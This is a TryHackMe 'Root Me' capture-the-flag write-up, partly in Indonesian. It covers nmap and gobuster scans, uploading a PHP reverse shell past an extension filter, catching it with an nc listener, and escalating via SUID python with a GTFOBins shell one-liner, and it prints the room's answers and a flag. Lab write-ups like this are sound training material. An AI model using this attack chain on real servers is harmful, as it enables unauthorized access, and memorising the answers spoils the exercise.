# THM_RootMe
Write Up TryHackMe Root Me url: https://tryhackme.com/room/rrootme

'''
Note: in my case my machine ip is 10.10.154.156
'''
# Task 2: Reconnaissance

## Step One: Scan The Machine IP
```
sudo nmap -sS -sC -sV MachineIP -v

output:
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-23 02:05 WIB
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 02:05
Scanning 10.10.154.156 [4 ports]
Completed Ping Scan at 02:05, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:05
Completed Parallel DNS resolution of 1 host. at 02:05, 0.11s elapsed
Initiating SYN Stealth Scan at 02:05
Scanning 10.10.154.156 (10.10.154.156) [1000 ports]
Discovered open port 80/tcp on 10.10.154.156
Discovered open port 22/tcp on 10.10.154.156
Completed SYN Stealth Scan at 02:05, 3.10s elapsed (1000 total ports)
Initiating Service scan at 02:05
Scanning 2 services on 10.10.154.156 (10.10.154.156)
Completed Service scan at 02:06, 7.10s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.154.156.
Initiating NSE at 02:06
Completed NSE at 02:06, 1.05s elapsed
Initiating NSE at 02:06
Completed NSE at 02:06, 0.85s elapsed
Nmap scan report for 10.10.154.156 (10.10.154.156)
Host is up (0.30s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds
           Raw packets sent: 1174 (51.632KB) | Rcvd: 1087 (43.488KB)

```

### question 1: how many port open
```
ans: 2
```
### question 2: What version of Apache is running?
```
ans: 2.4.29
```
### question 3: What service is running on port 22?
```
ans: SSH
```


## Step 2: Find directories on the web server using the GoBuster tool.
```
gobuster dir -u http://MachineIP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

output:
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.154.156/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/23 02:15:00 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 316] [--> http://10.10.154.156/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.154.156/css/]    
/js                   (Status: 301) [Size: 311] [--> http://10.10.154.156/js/]     
/panel                (Status: 301) [Size: 314] [--> http://10.10.154.156/panel/]  
Progress: 6801 / 220561 (3.08%)                                                   
[!] Keyboard interrupt detected, terminating.
                                                                                   
===============================================================
2021/11/23 02:17:50 Finished
===============================================================
```
### Question 4: What is the hidden directory?
```
ans: /panel/
```

# Task 2: Getting a shell
## Step one: Go To The /panel/ directory
```
Note: Uploads your reverse shell  And use bypass extension.
```
If you don't have revers shell go https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
Then in your terminal type 
```bash
nc -lvnp <PORT>
```
And go to /uploads directory and opened your reverse web shell
if its work
```
connect to [10.9.3.216] from (UNKNOWN) [10.10.154.156] 58032
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:32:16 up 29 min,  0 users,  load average: 0.00, 0.00, 0.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
### Question 1: user.txt
use command find / -type f -name user.txt 2>/dev/null
user.txt its found
use command cat (PATH)/user.txt to see the flag
```
ans: THM{y0u_g0t_a_sh3ll}
```

# Task 3: Privilege escalation
ah dahlah, di sini BINDO AE:v

## Pertanyaan 1: Search for files with SUID permission, which file is weird?
nah untuk cari SUID permission anu command find / -perm -4000 2>/dev/null
nah di situ ada yang anuh. python nya masuk ke permission 4000 nya
jadi kita isi
```
Jawaban: /usr/bin/python
```
## Pertanyaan ke 2: root.txt
nah ini nih puncak nya
kita kan bukan user root(kalo ga percaya coba anu command whoami), sedangkan kita mencari root.txt. udah pasti file nya di dir /root :v 
trus gimana banh biar bisa ke jadi user root. Nah itu namany privilege Escalation nah di kali ini ini nyanya SUID vuln
di situ kan yang aneh tadi pythonya. kok aneh? karena pythonya bisa menjalankan user root alias sudo. Nah trus gimana cara nya biar kita jadi user root?
kita bergi ke google ketik GTFobinstrus buka webnya ketik python
nah di situ ada deh. cari yang SUID trus di copy. nih buat yang males
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
lalu kita ketik whoami
selamat anda jadi HEKERRR SEJATI :v. eits root.txt nya belum
ya tinggal nyari dong. Cara nya sama kayak nyai user.txt
find / -type f -name root.txt 2>/dev/null
nah file flagnya root.txt bener kan ada di dir /root :v 
klo udah tinggal anu deh
cat /root/root.txt
```
Jawaban: PIKIR SENDIRI:V
```


Makasih kawand udah mau baca. klo boleh follow dong:D
Sankyuu
Copyright By Babwa Wibu
